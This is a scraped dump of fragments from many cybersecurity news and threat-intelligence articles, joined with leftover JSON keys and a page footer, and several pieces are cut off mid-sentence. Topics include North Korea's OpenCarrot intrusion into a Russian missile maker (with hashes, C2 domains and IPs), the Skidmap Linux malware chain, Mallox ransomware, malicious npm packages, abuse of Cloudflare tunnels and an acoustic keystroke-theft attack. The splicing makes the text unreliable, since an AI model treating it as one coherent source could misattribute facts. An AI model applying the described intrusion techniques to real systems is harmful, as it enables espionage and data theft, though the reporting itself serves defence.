researcher at Checkmarx and has a passion for making cyberspace a safer place to live and work.Yehuda Gelbincheckmarx-security--1Jossef Harush Kadouriincheckmarx-security--Jossef Harush Kadouriincheckmarx-security--Yehuda Gelbincheckmarx-security--1mthchtinDetect FYI--1montysecurity--Anton ChuvakininAnton on Security--1Forrest KaslerinPosts By SpecterOps Team Members--Nasreddine BencherchaliinSigma_HQ--Yehuda Gelbincheckmarx-security--HelpStatusAboutCareersBlogPrivacyTermsText to speechTeams"

      "title": "Comrades in Arms? | North Korea Compromises Sanctioned Russian Missile Engineering Company - SentinelOne",
      "text": " By Tom Hegel and Aleksandar Milenkoski While conducting our usual hunting and tracking of suspected-North Korean threat actors, we identified a leaked email collection containing an implant with characteristics related to previously reported DPRK-affiliated threat actor campaigns. A thorough investigation of the email archive revealed a larger intrusion, not fully recognized at the time by the compromised organization.We are highly confident that the emails related to this activity originate from the victim organization. Furthermore, there are no discernible signs of manipulation or technically verifiable inaccuracies present in these emails. It’s essential to highlight that the leaked data comprises a substantial volume of emails unrelated to our current research scope. This suggests that the leak was likely accidental or resulted from activity unrelated to the specific intrusion under scrutiny in our investigation. However, this collection provides valuable background context for our understanding of their internal network design, security gaps, and even cases of activity by other attackers.Following an examination of the emails and an in-depth investigation into the two separate sets of suspicious activity, we have successfully established a correlation between each cluster of activity and a respective threat actor amounting to a more significant network intrusion than the victim organization realized.This intrusion gives rare insight into sensitive DPRK cyberespionage campaigns, and an opportunity to expand our understanding of the relationship and goals between various North Korean cyber threat actors. It also highlights a potential rift in relations between Russia and North Korea, considering their growing relationship.This engagement establishes connections between two distinct DPRK-affiliated threat actors, suggesting the potential for shared resources, infrastructure, implants, or access to victim networks. Moreover, we acknowledge the possibility that the assigned task of an intrusion into NPO Mashinostroyeniya might have warranted targeting by multiple autonomous threat actors due to its perceived significance.The OpenCarrot sample we analyzed is implemented as a Windows service DLL file, intended to execute in a persistent manner. In line with typical practices of the Lazarus group, OpenCarrot is subject to continuous, not necessarily incremental, changes. The file has a compilation timestamp of Wednesday, Dec. 01, 2021. Although the timestamp could have been manipulated by the threat actors, given the proximity to the May 2022 suspected intrusion date, it’s likely that the timestamp is authentic. Our confidence in this assessment also increases through the infrastructure analysis below.The OpenCarrot variant we analyzed implements over 25 backdoor commands with a wide range of functionality representative of Lazarus group backdoors.  In this case, supported functionality includes:The OpenCarrot sample displays further characteristics often seen among Lazarus Group malware.OpenCarrot’s versatility is evident with its support of multiple methods for communicating with C2 servers. The malware dispatches commands for execution based on attacker-provided data originating not only from remote C2 servers, but also from local processes through named pipes and incoming connections to a TCP port on which OpenCarrot listens.We link the NPO Mashinostroyeniya email discussing suspicious networking communication as active C2 communications occurring through 192.169.7[.]197, and 5.134.119[.]142. The internal host, the organization’s Red Hat email server, was actively compromised and in communication with the attackers malicious infrastructure. A review of all details concludes the threat actor was likely operating on this server for an extensive period of time prior to the internal team’s discovery.This set of malicious infrastructure was served via CrownCloud (Australia) and OhzCloud (Spain) VPS hosting providers. During the intrusion, the two domains centos-packages[.]com and redhat-packages[.]com were resolving to those C2 IP addresses. Our assessment is that this particular cluster of infrastructure became active in November 2021, and was immediately paused the same day of NPO Mashinostroyeniya’s intrusion discovery in May 2022. This finding may indicate the intrusion was high priority and closely monitored by the operators.A relationship can be observed between this cluster of activity and a more recent ScarCruft campaign. Following the intrusion operators immediately killing their C2 server when the suspicious traffic was identified by the victim in May 2022, the centos-packages[.]com domain use was paused until it began resolving to 160.202.79[.]226 in February 2023. 160.202.79[.]226 is a QuickPacket VPS (US) hosting IP also being shared with the domain dallynk[.]com and others used by ScarCruft for malware delivery and C2 initiated through malicious documents.With a high level of confidence, we attribute this intrusion to threat actors independently associated with North Korea. Based on our assessment, this incident stands as a compelling illustration of North Korea’s proactive measures to covertly advance their missile development objectives, as evidenced by their direct compromise of a Russian Defense-Industrial Base (DIB) organization.The convergence of North Korean cyber threat actors represents a profoundly consequential menace warranting comprehensive global monitoring. Operating in unison as a cohesive cluster, these actors consistently undertake a diverse range of campaigns motivated by various factors. In light of these findings, it becomes crucial to address and mitigate this threat with utmost vigilance and strategic response.MD5:\n9216198a2ebc14dd68386738c1c59792\n6ad6232bcf4cef9bf40cbcae8ed2f985\nd0f6cf0d54cf77e957bce6dfbbd34d8e\n921aa3783644750890b9d30843253ec6\n99fd2e013b3fba1d03a574a24a735a82\n0b7dad90ecc731523e2eb7d682063a49\n516beb7da7f2a8b85cb170570545da4bSHA1:\n07b494575d548a83f0812ceba6b8d567c7ec86ed\n2217c29e5d5ccfcf58d2b6d9f5e250b687948440\n246018220a4f4f3d20262b7333caf323e1c77d2e\n8b6ffa56ca5bea5b406d6d8d6ef532b4d36d090f\n90f52b6d077d508a23214047e680dded320ccf4e\nf483c33acf0f2957da14ed422377387d6cb93c4d\nf974d22f74b0a105668c72dc100d1d9fcc8c72deredhat-packages[.]com\ncentos-packages[.]com\ndallynk[.]com\nyolenny[.]com\n606qipai[.]com\nasplinc[.]com\nbsef.or[.]kr192.169.7[.]197\n160.202.79[.]226\n96.9.255[.]150\n5.134.119[.]142Get notified when we post new content.Thanks!

They remain a favorite tactic of hacktivists as readily available tools make launching attacks relatively cheap and easy.It’s claimed that no sensitive data was exfiltrated as part of the attacks, which have been attributed to the same actor that compromised NASA and Germany’s Max Planck Institute.The bureau urged all American CNI firms to use DDoS mitigation services, collaborate more closely with ISPs to manage traffic during incidents and to create a disaster recovery plan."

      "text": " Freelance JournalistCybersecurity experts have discovered a new adware campaign specifically targeting Korean Android users. The discovery by McAfee’s Mobile Research Team shed light on a trend where certain apps distributed through Google Play discreetly load ads while the user’s device screen is turned off.In an advisory published last Friday, the security researchers said that, on the surface, this might seem like a hassle-free way for developers to generate profits without subjecting users to intrusive ads. However, the practice clearly violates Google Play Developer policies, which dictate how ads should be displayed. Such malicious ad-loading defrauds advertisers who unknowingly pay for invisible ads and adversely affect users in multiple ways.The team identified 43 rogue apps involved in this ad fraud, collectively amassing 2.5 million downloads. Popular categories like TV/DMB players, music downloaders, news and calendar apps were among the affected applications.The ad fraud library used by these apps is technically sophisticated, employing delay tactics to evade detection and inspection. Additionally, the fraudulent behavior can be remotely modified and pushed using Firebase Storage or Messaging service, adding a layer of complexity to identifying the rogue apps.When the device screen is turned off, the ad fraud kicks into action, fetching and loading ads, all while users remain oblivious. The library registers device information and accesses unique domains to retrieve advertisement URLs from Firebase Storage, draining battery life and consuming mobile data.Editorial image credit: sdx15 / Shutterstock.com"

      "text": " Trustwave researchers spotted a new, improved, and dangerous Skidmap variant, which was designed to target a wide range of Linux distributions, including  Alibaba, Anolis, openEuler, EulerOS, Steam, CentOS, RedHat, and Rock.The variant analyzed by the researchers was observed targeting only open Redis instances (so-called ‘NO AUTH’). No brute-force attacks were observed by the researchers.The attack chain starts with an attempt to login to the unsecured Redis instance and set up variables containing base64-encoded cron tasks. The Cron runs a job every 10 minutes by alternating between ‘curl’ and ‘wget’ to download and execute the dropper script.Trustwave observed threat actors deploying a dropper shell script that’s designed to distribute the binary executable file (ELF) that masquerades as a GIF image file (while a previous version of the malware used ‘jpeg’).Once the shell script is deployed, the malware adds ssh keys in standard locations: ‘/root/.ssh/authoried_keys’ and ‘/root/.ssh/authoried_keys2’.Then the malicious code disables the SELinux and creates a reverse shell that will call back to the C2 every hour via TCP/8443 port.The package uses several shell scripts to install the kernel modules, including one to purge the logs and launch a bot that allows operators to retrieve additional rootkit payloads. The mcpuinfo.ko payload is used to hide the miner, while kmeminfo.ko allows the malicious code to inspect network packets and manipulate them. Some variants observed by the experts included a built-in miner.“The level of advancement of this malware is really high, and detecting it, especially in larger server infrastructures, can be very hard. When testing it on home computers, the only serious indicator that something was wrong was the excessive operation of fans, and in the case of laptops, the temperature of the case” concludes the report that also includes Indicators of Compromise (IoCs). “And finally, what about Redis? Exploiting this flaw doesn’t look complex. And it’s true. Redis is vulnerable by design, and its place is not at the edge of the network. It was designed for a closed environment, and security features were added in later releases.”\nCopyright@securityaffairs 2023 "

These malicious activities could potentially paralyse infrastructure operations with unpredictable consequences.According to the report, Russia’s traditional intelligence gathering activity relied on spies with diplomatic cover, but this approach has become substantially more difficult since Russia invaded Ukraine, because many Russian diplomats have been expelled from the West.The report pointed out that despite the Russian reactions to Finland’s NATO accession process have been restrained for the time being, and Finland was not targeted by any extraordinary influencing in the course of policymaking, the government fears an escalation of the malicious activities.The agency also warned that these operations mainly target organizations and individuals from Western countries who reside in Finland.The Russian security and intelligence services were increasingly targeting foreigners who reside in or visit Russia as well as Russians working in the West when they return.SUPO also warned that Russian citizens working in critical positions in Finland may also be subject to coercion from Russian authorities.Finland has yet to suffer a disruptive attack, Pahlman explained that the cyber resilience of Finnish organizations is higher compared to their international counterparts.“Obviously, offensive [capabilities], attacking back, is something that’s publicly discussed often… The world’s superpowers, the larger states, they all have offensive capabilities, we’ve read about them over the years, however at least statistically they haven’t been able to save these nations from being targeted by attacks, sometimes even in pretty severe cases,” concluded Pahlman. “So I don’t believe there’s a single silver bullet.”\nCopyright@securityaffairs 2023 "

It surfaced recently with a new variant and various additional malware tools to achieve persistence and evade detection as it continues to gather momentum.However, the group has also started switching things up in later stages of the attack to maintain a stealthy presence on targeted networks and hide its malicious activity, the researchers found.The team identified the campaign upon investigation of suspicious network connections related to PowerShell, which led it to the discovery of a new variant of Mallox, which TrendMicro refers to as TargetCompany.\"When we checked the payload binary, we saw that the variant belongs to the second version of the said ransomware family, commonly characterized by a connection to a command-and-control (C2) server with a '/ap.php' landing page,\" the researchers revealed in the post.However, since the initial attempt at access was terminated and blocked by existing security solutions, \"the attackers opted to use the [fully undetectable] FUD-wrapped version of their binaries\" to continue its attack,\" the researchers wrote.While using FUD packers and Metasploit are not new tactics, it does show how Mallox, like other attackers, \"will keep innovating even the simplest means of abuse\" to evade defenses put up by organizations to avoid compromise, the researchers noted.\"Security teams and organizations should not underestimate its effectivity in circumventing current and established security solutions, especially in key features that leave technologies almost blind until a victim is documented,\" they wrote in the post.TrendMicro expects that the majority of Mallox' victims still have vulnerable SQL Servers that are being exploited to gain entry. To combat this, security teams should have visibility into their patching gaps, and check all possible attack surfaces to ensure their respective systems are not susceptible to abuse and exploitation.Moreover, best practices for network blocking as well as specific ransomware detection and blocking measures also can provide a multi-layered approach to mitigate the impact of the risks that these threats present.\"Organizations should encourage and implement redundant exercises ensuring users' awareness of their own systems and networks to prevent intrusion attempts and execution of malicious activities,\" the researchers wrote.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " The findings come from Accenture Cyber Threat Intelligence (ACTI) and its Dark Web reconnaissance efforts. While threat actors have historically directed their attacks at Windows and Linux devices, the ACTI team has observed a vast Dark Web community of skilled attackers who have set their sights on Macs.Thomas \"Mannie\" Willkan, a cyber threat intelligence consultant with Accenture's ACTI who monitors Dark Web activity, tells Dark Reading that threat actors have traditionally ignored macOS. \"It was more lucrative and easier to target Windows and Linux, but now, they have changed their scoping,\" Willkan says. \"I think, partly, it is because they are constantly innovating and trying to stay ahead of security measures. But also, it's because there's now an economic incentive to target the Mac.\"Macs in the enterprise are often more vulnerable because organizations don't apply the same conditional access and other policies as they impose on Windows devices, says Jason Dettbarn, CEO of Addigy, which provides a macOS and iOS management platform. Dettbarn says CISOs are increasingly taking a more proactive posture toward the security of Macs.\"Rapid Security Response is considered to be the highest required patch, meaning you can assume it is actively being exploited,\" Dettbarn says. \"Every CISO I know says 'We're not applying a patch unless we have a public disclosure of what it is.'\"ACTI has observed exploits for Macs that sell at a premium over those targeting Windows PCs. For example, ACTI found one threat actor that offered $500,000 in December 2022 for a macOS Gatekeeper bypass or exploits.Accenture managing director of global cyber response and transformation services Rob Boyce points to a growing number of \"skilled actors\" with sophisticated macOS-based attack tools. The threat actor advertised Apple Enterprise Certificates that can bypass macOS Gatekeeper, which has become \"a highly desirable service for macOS-focused threat actors,\" Boyce writes.Accenture also discovered that a well-known initial access broker with ties to the Conti and REvil ransomware groups purchased and tested the XLoader malware in 2022, which operates in macOS. Accenture anticipates the growth of threat actors targeting Macs will continue into 2024 and beyond.The growth of Macs has also resulted in more macOS-specific info stealers, remote access Trojans, loaders, and zero-days, Willkan says. ACTI says it has also observed Dark Web threat actors tied to initial access brokers, and potentially data extortion groups, claiming to have procured macOS-based info stealers.\"A lot of private users and a lot of industries are still under this false sense of security when they use Mac because they've been told that you can't be affected by a virus if you're on a Mac.

      "text": " The North Korean state-sponsored hacking group ScarCruft has been linked to a cyberattack on the IT infrastructure and email server for NPO Mashinostroyeniya, a Russian space rocket designer and intercontinental ballistic missile engineering organization.While the main purpose of the attack is unclear, the ScarCruft (APT37) is a cyber espionage group known to surveil and steal data from organizations as part of their cyber campaigns.The security analysts discovered the breach after analyzing an email leak from NPO Mashinostroyeniya that contained highly confidential communications, including a report from IT staff warning of a potential cybersecurity incident in mid-May 2022.SentinelLabs leveraged the information in these emails to undertake an investigation, discovering a much more significant intrusion than the missile maker realized.According to the leaked emails, IT staff at NPO Mashinostroyeniya discussed suspicious network communication between processes running on internal devices and external servers.This ultimately led to the company finding a malicious DLL installed on internal systems, causing them to engage with their antivirus firm to determine how they had become infected.After analyzing the IP addresses and other indicators of compromise (IOCs) found in the emails, SentinelLabs determined that the Russian organization was infected with the 'OpenCarrot' Windows backdoor.While it is not clear if this was a joint operation between ScarCruft and Lazarus, it is not uncommon for North Korean hackers to utilize tools and tactics that overlap with other state-sponsored threat actors in the country.The variant of OpenCarrot used in this particular attack was implemented as a DLL file, supports proxying communications through internal network hosts.The backdoor supports a total of 25 commands, including:When legitimate users on the compromised devices become active, OpenCarrot automatically enters a sleep state and checks every 15 seconds for the insertion of new USB drives that can be laced and used for lateral movement.Simultaneously, SentinelLabs saw evidence of suspicious traffic originating from the victim's Linux email server, which was beaconing outbound to ScarCruft infrastructure.The analysts are still determining the intrusion method but mention the possibility of the threat actors using their signature RokRAT backdoor.SentinelLabs suggests that the involvement of two state-supported hacking groups could indicate a deliberate strategy by the North Korean state that controls both.By assigning multiple actors to infiltrate NPO Mashinostroyeniya, which they probably considered a significant target for espionage, the state may have sought to amplify the probability of a successful breach."

At the same time, the threat actor can modify a tunnel's configuration, disable, and enable it as needed in real-time.\"For example, the TA could enable RDP connectivity, collect information from the victim machine, then disable RDP until the following day, thus lowering the chance of detection or the ability to observe the domain utilized to establish the connection.\"Because the HTTPS connection and data exchange occurs over QUIC on port 7844, it is unlikely that firewalls or other network protection solutions will flag this process unless they are specifically configured to do so.To make matters worse, GuidePoint says it's also possible to abuse Cloudflare's 'Private Networks' feature to allow an attacker who has established a tunnel to a single client (victim) device to access an entire range of internal IP addresses remotely.\"Now that the private network is configured, I can pivot to devices on the local network, accessing services that are limited to local network users,\" warned GuidePoint researcher Nic Finn.To detect unauthorized use of Cloudflare Tunnels, GuidePoint recommends that organizations monitor for specific DNS queries (shared in the report) and use non-standard ports like 7844."

The document highlights that the design and development of products must change so that exploitable vulnerabilities do not reach market.The Plan also emphasizes how adversaries, incidents and vulnerabilities must be quickly detected in order to mitigate issues before harm occurs.“We must help organizations, particularly those that are “target rich, resource poor,” take the fewest possible steps to drive the most security impact,” the Plan states.The plan outlines three goals:CISA notes that as it implements the Strategic Plan, changes to the threat and technology environments may require periodic re-evaluation of strategic priorities.

On closer inspection, Phylum’s researchers discovered that these packages were part of a sophisticated and targeted malware attack aimed at exfiltrating sensitive developer source code and confidential information.The attack demonstrated a carefully crafted development cycle, with the attacker refining the malware’s functionality through several iterations. The final “production” packages were disguised with legitimate-sounding names, potentially tricking victims into installing them unwittingly.Upon analyzing the attack code, Phylum uncovered that it utilized a combination of post-install hooks and pre-install scripts to trigger the execution of malicious code once the packages were installed. This code was designed to perform several actions.First, the malware gathered the machine’s operating system (OS) username and current working directory and sent this information as URL query parameters in an HTTP GET request to a remote server.Next, the malware scanned the victim’s directories for files with specific extensions or located in specific directories known to contain sensitive information, such as credentials or configuration files.Once the target files and directories were identified, the malware created ZIP archives, excluding certain standard application directories to avoid unnecessary bulk.

The new attack infrastructure was created starting from March 2023 and consists of 94 new domains.Since at least December 17, 2022, the group has used a new naming pattern for its domains containing keywords related to information technology and cryptocurrency. Some examples are cloudrootstorage[.]com, directexpressgateway[.]com, storagecryptogate[.]com, and pdfsecxcloudroute[.]com.In previous campaigns, the majority of the domains have been registered by BlueCharlie with the Porkbun registrar, followed by NameCheap, Regway, and REGRU.After the disclosure of the report on previous attacks, seventy-eight of the 94 new domains have been registered using NameCheap. Researchers recommend that organizations implement multi-factor authentication (MFA), enforce a frequent password reset policy, disable all macros by default in Microsoft Office products, train employees, contractors, and third-party vendors to protect against phishing, spearphishing, and social engineering attacks, properly configure intrusion detection systems (IDS), IPS, or any network defense mechanisms in place.“BlueCharlie has demonstrated the ability to adapt and evolve over time to public reporting, and will likely continue to change their TTPs based on past precedent. Given the group’s historical use of phishing, were commend network defenders employ robust anti-phishing training and highly encourage the use of a FIDO2-compliant multi-factor authentication token, such as aYubikey.,” concludes the report.The report includes Indicators of Compromise (IoCs) for this threat.\nCopyright@securityaffairs 2023 "

      "text": " A team of researchers from British universities has trained a deep learning model that can steal data from keyboard keystrokes recorded using a microphone with an accuracy of 95%.When Zoom was used for training the sound classification algorithm, the prediction accuracy dropped to 93%, which is still dangerously high, and a record for that medium.Such an attack severely affects the target's data security, as it could leak people's passwords, discussions, messages, or other sensitive information to malicious third parties.Moreover, contrary to other side-channel attacks that require special conditions and are subject to data rate and distance limitations, acoustic attacks have become much simpler due to the abundance of microphone-bearing devices that can achieve high-quality audio captures.This, combined with the rapid advancements in machine learning, makes sound-based side-channel attacks feasible and a lot more dangerous than previously anticipated.The first step of the attack is to record keystrokes on the target's keyboard, as that data is required for training the prediction algorithm. This can be achieved via a nearby microphone or the target's phone that might have been infected by malware that has access to its microphone.Alternatively, keystrokes can be recorded through a Zoom call where a rogue meeting participant makes correlations between messages typed by the target and their sound recording.The researchers gathered training data by pressing 36 keys on a modern MacBook Pro 25 times each and recording the sound produced by each press.Then, they produced waveforms and spectrograms from the recordings that visualize identifiable differences for each key and performed specific data processing steps to augment the signals that can be used for identifying keystrokes.The spectrogram images were used to train 'CoAtNet,' which is an image classifier, while the process required some experimentation with epoch, learning rate, and data splitting parameters until the best prediction accuracy results could be achieved.In their experiments, the researchers used the same laptop, whose keyboard has been used in all Apple laptops for the past two years, an iPhone 13 mini placed 17cm away from the target, and Zoom.The CoANet classifier achieved 95% accuracy from the smartphone recordings and 93% from those captured through Zoom. Skype produced a lower but still usable 91.7% accuracy.Other potential defense measures include using software to reproduce keystroke sounds, white noise, or software-based keystroke audio filters.Remember, the attack model proved highly effective even against a very silent keyboard, so adding sound dampeners on mechanical keyboards or switching to membrane-based keyboards is unlikely to help.Ultimately, employing biometric authentication where feasible, and utilizing password managers to circumvent the need to input sensitive information manually, also serve as mitigating factors.Update 8/16 - A Zoom spokesperson has sent BleepingComputer the following comment on the above:Zoom takes the privacy and security of our users seriously.In addition to the mitigation techniques suggested by the researchers, Zoom users can also configure our background noise suppression feature to a higher setting, mute their microphone by default when joining a meeting, and mute their microphone when typing during a meeting to help keep their information more secure.\n "

      "text": " The Clop ransomware gang has once again altered extortion tactics and is now using torrents to leak data stolen in MOVEit attacks.On June 14th, the ransomware gang began extorting its victims, slowly adding names to their Tor data leak site and eventually publicly releasing the files.However, leaking data via a Tor site comes with some drawbacks, as the download speed is slow, making the leak, in some cases, not as damaging as it could be if it was easier to access the data.As a new solution to these issues, Clop has begun to use torrents to distribute data stolen from MOVEit attack.As part of this new extortion method, Clop has set up a new Tor site providing instructions on how to use torrent clients to download the leaked data and lists of magnet links for the twenty victims.As torrents use peer-to-peer transfer among different users, the transfer speeds are faster than the traditional Tor data leak sites.In a brief test by BleepingComputer, this method resolved the poor data transfer issues, as we were receiving 5.4 Mbps data transfer speeds, even though it was only seeded from one IP address in Russia.Furthermore, as this distribution method is decentralized, there is no easy way for law enforcement to shut it down. Even if the original seeder is taken offline, a new device can be used to seed the stolen data as necessary.If this proves successful for Clop, we will likely see them continue to utilize this method to leak data as it’s easier to set up, does not require a complex website, and may further pressure victims due the increased potential for broader distribution of stolen data.Whether or not the use of torrents will lead to more payments is yet to be determined; however, with these earnings, it may not matter."

CDHE also worked to restore systems and return to normal operations. \"When ransomware gangs breach an organization, they quietly spread through a network while stealing sensitive data and files from computers and servers. When done stealing data and finally gaining access to an administrator account on the network, the threat actors deploy ransomware to encrypt the computers on the network.The stolen data is then used in double-extortion attacks, where they threaten to publicly leak data unless a ransom is paid.According to the CDHE, this tactic was used on its network, with their investigation revealing that the threat actors had access to their systems between June 11th and June 19th. During this time, the threat actors stole data from the Department's systems that spanned 13 years between 2004 and 2020.The data stolen from CDHE is significant, impacting the following students, past students, and teachers who:The stolen information includes full names, social security numbers, dates of birth, addresses, proof of addresses (statements/bills), photocopies of government IDs, and for some, police reports or complaints regarding identity theft.The CDHE did not share how many people were impacted, but as the scope of the breach ranges from 2004 to 2020, it likely encompasses a large number of individuals.Due to the sensitive nature of the exposed information, the CDHE provides free access to identify theft monitoring for 24 months to those impacted.While no ransomware operation has claimed responsibility for the attack, all affected users should assume their data will be used maliciously and stay vigilant against identity theft and phishing attacks.Therefore, be careful of phishing emails attempting to gather further information, such as passwords, account numbers, or financial information."

      "text": " Researchers from the Technical University of Berlin have developed a method to jailbreak the AMD-based infotainment systems used in all recent Tesla car models and make it run any software they choose.\n \nAdditionally, the hack allows the researchers to extract the unique hardware-bound RSA key that Tesla uses for car authentication in its service network, as well as voltage glitching to activate software-locked features such as seat heating and 'Acceleration Boost' that Tesla car owners normally have to pay for.\n \nThe German researchers shared the full details of their hack with BleepingComputer, which will be published in an upcoming BlackHat 2023 presentation scheduled for August 9, 2023, titled 'Jailbreaking an Electric Vehicle in 2023 or What It Means to Hotwire Tesla's x86-Based Seat Heater.'The researchers were able to hack the infotainment system using techniques based on the team's previous AMD research, which uncovered the potential for fault injection attacks that can extract secrets from the platform.Tesla's infotainment APU is based on a vulnerable AMD Zen 1 CPU; hence the researchers could experiment with the exploitation of the previously discovered weaknesses to achieve jailbreak.\"First, we present how we used low-cost, off-the-shelf hardware to mount the glitching attack to subvert the ASP's early boot code.\"\"We then show how we reverse-engineered the boot flow to gain a root shell on their recovery and production Linux distribution.\"By gaining root permissions, the researchers were free to perform arbitrary changes that survive infotainment system reboots and Tesla's 'over-the-air' updates.Moreover, they could access and decrypt sensitive information stored on the car's system, such as the owner's personal data, phonebook, calendar entries, call logs, Spotify and Gmail session cookies, WiFi passwords, and locations visited.\n \nThe jailbreak enables an attacker to extract the TPM-protected attestation key that Tesla uses to authenticate the car and verify its hardware platform's integrity, and migrate it to another car.\n \nBesides car ID impersonation on Tesla's network, this could also help in using the car in unsupported regions or performing independent repairs and modding, explain the researchers.\n \nAs for what tools are needed to jailbreak Tesla's infotainment system, one of the researchers Christian Werling, explains that a soldering iron and $100 worth of electronic equipment, like the Teensy 4.0 board, should be enough to do the trick.\n \nWerling also told BleepingComputer that they responsibly disclosed their findings to Tesla, and the carmaker is in the process of remediating the discovered issues.\"Tesla informed us that our proof of concept enabling the rear seat heaters was based on an old firmware version.\"\"In newer versions, updates to this configuration item are only possible with a valid signature by Tesla (and checked/enforced by the Gateway).\"\"So while our attacks lay some important groundwork for tinkering with the overall system, another software or hardware-based exploit of the Gateway would be necessary to enable the rear seat heaters or any other soft-locked feature.\" - Christian Werling.However, the key extraction attack still works in the latest Tesla software update, so the problem remains exploitable for now, Werling told BleepingComputer.Finally, some news outlets have claimed that the jailbreak can unlock Full-Self Driving (FSD), but the researcher told us this is false."

The group even bought stock and had fleece jackets made with the company name on, in order to maintain the cover story.Separately, some members used a breakdown recovery truck and a window fitting van to ferry cocaine and money around while hiding their activities.Group leader Craig Gallagher, 36, of Inchape Road, Liverpool, is said to have maintained two EncroChat handles. Officers trawled 40,000 messages to find out more about his plans to smuggle 50–100kg of cocaine twice a week inside computers, the NCA said.Gallagher had already imported at least 100kg of cocaine – with a street value of around £8m, the agency noted. As well as drugs offenses, he admitted trying to broker the sale of firearms including an AR-15 assault rifle, AK47s, Glock handguns, a Skorpion machine pistol and self-loading pistols.He received a sentence of 24 years. Two other members of the group – Christopher Van Maren, 41, of Rhodesia Road, Liverpool, and Wesley Campbell, 39, of Castle Green, Warrington – were handed 12-year sentences.A fourth man was jailed for 30 months last December and the remaining three will be sentenced in September.“They didn’t care about other people though, just money.

      "text": " The sale of decommissioned medical infusion pumps through the secondary market may lead to the potential exposure of Wi-Fi configuration settings.The researchers discovered that most of the medical infusion pumps that were purchased from secondary market services such as eBay were found to still contain wireless authentication data from the original medical organization that had deployed the devices. Rapid7 conducted an analysis on three distinct infusion pump models: the Alaris PC 8015, the Baxter Sigma Spectrum model 35700BAX2 along with its associated Wireless Battery Module (WBM), and the Hospira Abbott PLUM A+ with MedNet.The researchers analysed 13 infusion pumps that despite being no longer manufactured are still working in numerous medical organizations worldwide.The experts obtained the sensitive data by analyzing the content of compact flash cards, capturing serial communication while using the product’s maintenance software serial communication, and physically removing and extracting data from the flash memory chip on the main circuit boards.The equipment used for the research included flash Memory chip programmer ($75-$150), logic analyzer ($25-$500), JTAG programmer ($55-$500), hot air reflow or IR reflow oven ($65-$300), solder iron ($50-$125).The analysis of the Alaris 8015 allowed the researchers to retrieve hostnames with domain information, AES keys for encryption, SSIDs, Wi-Fi Pre Shared Keys (PSK) passphrase in clear text, credentials for Microsoft Active Directory authentication, and Wi-Fi configuration settings.The researchers pointed out that they haven’t found online documented data purge processes for device decommissioning. The Alaris security team explained that the documentation is only accessible to customers that have a support contract with Becton, Dickinson and Company (BD). However, the experts reported that current maintenance tools do support purging of data such as drug libraries, logs, and network configuration.The analysis of Baxter Sigma Spectrum 35700BAX2 devices and associated Wireless Battery Module (WBM) revealed Wi-Fi configuration data, including the Wi-Fi Protected Access (WPA) passphrase converted to a 64-character hex key (PSK).Baxter provides information about data purge processes and detailed instructions for reset wireless configurations for both the device and the WBM.The Hospira Abbott PLUM A+ with MedNet too also exposed Wi-Fi configuration information stored on the device. “During general evaluation of various documentation found online for the Hospira Plum A+ MedNet unit no single procedure could be located that detailed the needed steps for removing all critical data such as PHI, and Wi-Fi configuration data in preparation of decommissioning and transfer of an infusion pump.” continues the analysis.Rapid7 urges organizations use medical devices to build out policies and processes for how to properly handle the acquisition and de-acquisition of such kinds of systems.“The discovery of this data on de-acquisitioned medical devices being sold on the secondary market points out a serious systemic issue. To effectively resolve this issue, organizations that leverage medical technologies should build out policies and processes to properly handle the acquisition and de-acquisition of medical technology.” concludes the report. “The policies should define ownership and governance of the processes within the organization and what is expected to maintain solid security and protection of the data that is stored on these devices, which may include critical infrastructure configuration data and PHI related data.”\nCopyright@securityaffairs 2023 "

      "text": " Against the backdrop of the debacle that mitigating the BlackLotus bootkit has become, the Cybersecurity and Infrastructure Security Agency (CISA) is calling for revamped security for Unified Extensible Firmware Interface (UEFI) update mechanisms.\"Secure-by-design is about having the organizations that design the software take responsibility for the security, and that includes the update pathways,\" Jonathan Spring, senior technical advisor at CISA, tells Dark Reading in an exclusive interview.\"Anyone who purchases a system would have an expectation that is it secure by design and securely updateable,\" he says. \"This is an ongoing concern.\"\"BlackLotus exploits a failure in secure update distribution,\" Spring explained in the CISA post. \"BlackLotus can roll back a file to a vulnerable version and then exploit it, rendering the update distribution channel for UEFI updates on Windows not sufficiently resilient or secure.\"On a related note, Spring also says that if Microsoft had used a more secure-by-design public key infrastructure (PKI) approach for UEFI along with an automated update system, the issue might well be fixed by now.Generally in PKI management, there is one secret key, or certificate, that is kept \"very secret,\" while other, intermediate certificates are used to sign other files, which are easy to revoke in case of a problem. However, in Windows PKI, one key signs a large number of files, so to revoke it to mitigate the BlackLotus issue \"would cause a lot of collateral damage\" in other parts of the OS, he says, adding, \"Public key infrastructure shouldn't be signed like that.\"Spring notes, \"If the update distribution mechanism used appropriate PKI, I believe that those updates would have been distributed by default and the keys for the vulnerable files would have been removed by default, and we would be done.\"As a result of all of this, NSA has recommended that infrastructure owners take additional manual steps to harden their systems, such as tightening up user executable policies and monitoring the integrity of the boot partition. In the meantime, Microsoft is eyeing sometime in early 2024 for an automated and comprehensive fix for BlackLotus.\"The manual mitigation is quite difficult, and I don't think everyone is going to do it,\" Spring says. Therefore, the CISA hopes to promote a future in which \"these manual security fixes are not the norm,\" he says.To that end, CISA outlined in its post specifics on how a secure-by-design strategy, working in tandem with a mature product security incident response team (PSIRT), can jointly reinforce \"a holistic security engineering solution.\"These include the following efforts:Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

However, Mysterious Team Bangladesh wasted no time in making its mark, with a total of 846 attacks under its belt between June 2022 and last month, said the researchers, who have been tracking the group on its Telegram channel.The highest percentage of those attacks, 34%, occurred in India, followed by 18.1% of attacks in Israel; in fact, these nations appear to be Mysterious Team Bangladesh's top priorities.However, as the group has diversified its attack geographies and targets in recent months, the researchers expect the group to intensify its focus on financial companies and government entities in Europe, and other parts of Asia-Pacific and the Middle East, in the near future.\"The group shows a preference for targeting government resources and the websites of banks and financial organizations,\" according to the Group-IB post, which is attributed to John Doe. \"However, if the group is unable to find a victim within these sectors, they try to massively exploit domains within the targeted country's domain zone.\"A typical attack by Mysterious Team Bangladesh begins with the group taking notice of a news event that triggers a theme-based campaign against a specific country, which usually lasts about a week before the group loses interest. It then goes back to focusing on attacks against India and Israel.\"The use of PHP may involve PHPMyAdmin; both frameworks are quite common and have a large number of known exploits, which underlines the importance of timely software updates,\" Doe wrote in the post.While the bulk of the attacks have come so far in the form of DDoS, the group also has defaced targets' websites, and also, in some cases, may have gained access to 